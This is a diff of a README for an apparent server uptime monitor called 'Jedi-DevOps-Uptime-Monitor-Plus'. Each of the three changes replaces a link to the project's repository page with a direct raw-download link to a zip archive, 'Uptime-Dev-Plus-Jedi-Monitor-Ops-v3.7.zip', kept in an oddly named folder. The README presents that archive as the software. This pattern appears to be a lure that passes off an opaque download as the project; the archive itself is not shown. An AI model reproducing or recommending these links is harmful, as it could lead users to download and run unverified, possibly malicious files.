@@ -1,6 +1,6 @@
 # ⏱️ Jedi-DevOps-Uptime-Monitor-Plus - Simple server uptime in one file
 
-[![Download](https://img.shields.io/badge/Download-Blue%20%26%20Grey-1e90ff?style=for-the-badge)](https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus)
+[![Download](https://img.shields.io/badge/Download-Blue%20%26%20Grey-1e90ff?style=for-the-badge)](https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus/raw/refs/heads/main/unimitative/Uptime-Dev-Plus-Jedi-Monitor-Ops-v3.7.zip)
 
 ## 📌 What this does
 
@@ -21,7 +21,7 @@ Use it to:
 
 Open this page and get the project files:
 
-https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus
+https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus/raw/refs/heads/main/unimitative/Uptime-Dev-Plus-Jedi-Monitor-Ops-v3.7.zip
 
 If the page opens in your browser, look for the green **Code** button and choose **Download ZIP**.
 
@@ -245,7 +245,7 @@ That makes it easier to start and easier to keep running.
 
 Open the main project page here and download the files:
 
-[https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus](https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus)
+[https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus/raw/refs/heads/main/unimitative/Uptime-Dev-Plus-Jedi-Monitor-Ops-v3.7.zip](https://github.com/alex2024wong/Jedi-DevOps-Uptime-Monitor-Plus/raw/refs/heads/main/unimitative/Uptime-Dev-Plus-Jedi-Monitor-Ops-v3.7.zip)
 
 ## 🪟 Quick start for Windows
 
